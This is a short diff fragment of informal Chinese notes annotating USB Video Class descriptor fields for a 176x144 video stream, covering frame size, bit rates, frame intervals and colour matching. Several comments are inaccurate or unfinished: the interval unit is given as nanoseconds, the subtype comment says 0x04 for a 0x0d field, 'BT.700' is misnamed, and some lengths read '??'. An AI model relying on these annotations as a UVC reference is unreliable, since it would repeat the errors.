+		wWidth		176	//帧宽
+		wHeight		144	//帧高
+		dwMinBitRate	176*144*2*12    //视频流传输时,最小传输字节率 12张图片/s的字节率
+		dwMaxBitRate	176*144*2*30  	//视频流传输时,最大传输字节率 30张图片/s的字节率
+		dwMaxVideoFrameBufSize  176*144*2	//最大视频流缓存,一帧图片大小的数据的缓存
+		dwDefaultFrameInterval	0x000A2C2A	//默认帧与帧间的传输间隔: 0x000A2C2A=666666ns 即约莫15帧每秒
+		bFrameIntervalType	1	//从多个传输间隔中选取一个使用,这里选用dwFrameInterval[] 中第一个帧与帧间的传输间隔 ,
+		dwFrameInterval[]	0x000A2C2A,0x000A2C25 ....	//FrameInterval数值列,列出多个可用传输间隔!!
+	/* Class-specific color matching Descriptor */
+		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+		bDescriptorSubtype 0x0d	//descriptor 的子标记,0x04 表明是VS_colorformat 即原始格式视频流	
+		bColorprimaries 1	//BT.700, sRGB    ???
+		bTranfercharacteristics 1	
 
 
 
@@ -12980,4 +14279,4 @@ struct class是class的抽象，它的定义如下：
 
 
 
-
+(USB IN Endpoint 1,video streaming interface 1)
